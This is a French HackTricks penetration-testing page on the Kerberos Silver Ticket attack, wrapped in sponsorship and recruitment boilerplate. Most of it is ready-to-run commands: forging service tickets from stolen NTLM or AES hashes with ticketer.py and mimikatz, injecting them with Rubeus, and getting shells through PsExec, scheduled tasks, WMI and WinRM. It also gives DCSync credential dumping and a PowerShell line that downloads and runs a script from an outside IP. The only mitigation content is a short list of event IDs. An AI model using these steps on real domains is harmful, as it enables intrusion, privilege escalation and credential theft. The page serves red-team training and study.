# Billet Argenté

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en piratage** et pirater l'impénétrable - **nous recrutons !** (_polonais courant écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Billet Argenté

L'attaque du Billet Argenté repose sur la **création d'un TGS valide pour un service une fois que le hash NTLM du service est possédé** (comme le **hash du compte PC**). Ainsi, il est possible de **gagner l'accès à ce service** en forgeant un TGS personnalisé **en tant qu'utilisateur quelconque**.

Dans ce cas, le **hash NTLM d'un compte d'ordinateur** (qui est une sorte de compte utilisateur dans AD) est **possédé**. Par conséquent, il est possible de **créer** un **billet** afin de **pénétrer dans cette machine** avec des privilèges **d'administrateur** via le service SMB. Les comptes d'ordinateurs réinitialisent leurs mots de passe tous les 30 jours par défaut.

Il faut également prendre en compte qu'il est possible ET **PRÉFÉRABLE** (opsec) de **forger des billets en utilisant les clés Kerberos AES (AES128 et AES256)**. Pour savoir comment générer une clé AES, lisez : [section 4.4 de MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) ou [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
```markdown
Dans Windows, **Mimikatz** peut être utilisé pour **créer** le **ticket**. Ensuite, le ticket est **injecté** avec **Rubeus**, et finalement un shell à distance peut être obtenu grâce à **PsExec**.
```
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

#Example using aes key
kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
```
{% endcode %}

Le service **CIFS** est celui qui vous permet d'**accéder au système de fichiers de la victime**. Vous pouvez trouver d'autres services ici : [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**.** Par exemple, vous pouvez utiliser le **service HOST** pour créer une _**tâche planifiée**_ sur un ordinateur. Ensuite, vous pouvez vérifier si cela a fonctionné en essayant de lister les tâches de la victime : `schtasks /S <hostname>` ou vous pouvez utiliser le **service HOST et RPCSS** pour exécuter des requêtes **WMI** sur un ordinateur, testez-le en faisant : `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### Atténuation

ID des événements de Silver ticket (plus discret que golden ticket) :

* 4624 : Connexion de compte
* 4634 : Déconnexion de compte
* 4672 : Connexion admin

[**Plus d'informations sur les Silver Tickets chez ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## Services disponibles

| Type de service                            | Silver Tickets pour services                                              |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Selon l'OS aussi :</p><p>WSMAN</p><p>RPCSS</p>   |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Parfois vous pouvez juste demander : WINRM</p>   |
| Tâches planifiées                          | HOST                                                                       |
| Partage de fichiers Windows, aussi psexec  | CIFS                                                                       |
| Opérations LDAP, incluant DCSync           | LDAP                                                                       |
| Outils d'administration à distance Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

En utilisant **Rubeus**, vous pouvez **demander tous** ces tickets en utilisant le paramètre :

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

## Exploitation des tickets de service

Dans les exemples suivants, imaginons que le ticket est récupéré en se faisant passer pour le compte administrateur.

### CIFS

Avec ce ticket, vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers dans une partie du système de fichiers à distance en faisant simplement quelque chose comme :
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### HÔTE

Avec cette permission, vous pouvez générer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires :
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HÔTE + RPCSS

Avec ces tickets, vous pouvez **exécuter WMI dans le système victime** :
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trouvez **plus d'informations sur wmiexec** dans la page suivante :

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HÔTE + WSMAN (WINRM)

Avec un accès winrm sur un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell :
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consultez la page suivante pour apprendre **plus de méthodes pour se connecter à un hôte distant en utilisant winrm** :

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Notez que **winrm doit être actif et à l'écoute** sur l'ordinateur distant pour y accéder.
{% endhint %}

### LDAP

Avec ce privilège, vous pouvez extraire la base de données du DC en utilisant **DCSync** :
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**En savoir plus sur DCSync** dans la page suivante :

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en hacking** et par hacker l'inviolable - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
